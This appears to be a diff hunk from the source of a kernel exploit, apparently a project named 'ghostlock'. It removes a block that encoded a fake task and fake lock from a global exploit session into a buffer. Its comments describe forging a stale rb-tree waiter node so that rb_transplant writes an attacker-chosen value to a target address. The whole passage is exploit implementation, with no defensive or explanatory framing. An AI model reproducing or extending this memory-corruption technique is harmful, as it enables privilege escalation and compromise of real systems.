@@ -37,21 +37,6 @@ namespace ghostlock::route {
      * rejects an undersized buffer before any indexed write. */
     __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
         memset(stamp, 0, sizeof(stamp));
-        if (!memory::encode_multicast_waiter(
-            {reinterpret_cast<std::byte *>(stamp), stamp_size},
-            static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
-            *layout.lock_offset,
-            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
-            status.step = 59;
-            status.error_number = EOVERFLOW;
-            status.userspace_clean = 1;
-            status.kernel_disarmed = 1;
-            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
-                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
-                       static_cast<size_t>(*layout.task_offset),
-                       static_cast<size_t>(*layout.lock_offset), stamp_size);
-            return status;
-        }
         /* W1 tree placement: forge the stale waiter's rb node so the walk's
          * rb_transplant writes the page-derived value through target-8.
          * task/lock keep their stale (real) values: the walk self-cycles on
